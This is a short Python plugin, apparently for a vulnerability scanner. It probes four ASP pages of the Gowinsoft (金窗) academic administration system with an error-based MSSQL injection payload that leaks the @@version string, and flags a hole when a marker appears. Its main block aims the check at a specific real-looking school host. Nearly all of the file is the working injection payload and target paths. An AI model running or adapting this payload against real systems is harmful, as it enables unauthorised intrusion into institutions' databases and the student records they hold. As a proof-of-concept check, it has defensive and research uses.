#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:金窗教务系统五处注入 捡漏yinniu
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0101234
#Author:xq17

def assign(service, arg):
    if service == "gowinsoft_jw":
        return True, arg
                
def audit(arg):
    urls = [
    "jiaoshi/shizi/shizi/textbox.asp?id=1",
    "jiaoshi/sj/shixi/biyeshan1.asp?id=1",
    "jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
    "jiaoshi/xueji/shen/autobh.asp?jh=1",
    ]

    data = "%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'GAO JI@Microsoft SQL Server' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('gowinsoft_jw','http://www.cdtlgcxx.com:2110/')[1])